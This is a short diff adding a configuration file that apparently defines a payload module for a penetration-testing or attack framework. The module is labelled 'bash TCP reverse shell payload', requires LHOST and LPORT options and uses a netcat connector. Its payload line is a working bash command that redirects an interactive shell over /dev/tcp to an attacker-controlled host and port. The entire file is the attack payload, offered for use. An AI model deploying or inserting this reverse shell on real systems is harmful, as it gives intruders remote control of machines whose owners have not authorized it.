@@ -1,0 +1,5 @@
+title=bash TCP reverse shell payload
+info=bash command to spawn a reverse shell. No special opts required.
+required_opts=LHOST;LPORT
+connector=reverse_tcp_netcat
+payload=/bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1
